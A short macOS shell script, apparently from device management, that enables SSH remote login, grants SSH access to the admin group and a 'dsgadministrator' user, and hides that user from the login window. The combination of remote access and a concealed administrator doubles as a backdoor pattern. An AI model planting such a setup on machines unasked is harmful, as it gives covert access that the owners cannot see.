#!/bin/sh

systemsetup -setremotelogin on
dseditgroup -o create -q com.apple.access_ssh
dseditgroup -o edit -a admin -t group com.apple.access_ssh
dseditgroup -o edit -a dsgadministrator -t user com.apple.access_ssh
defaults write /Library/Preferences/com.apple.loginwindow HiddenUsersList -array dsgadministrator

exit
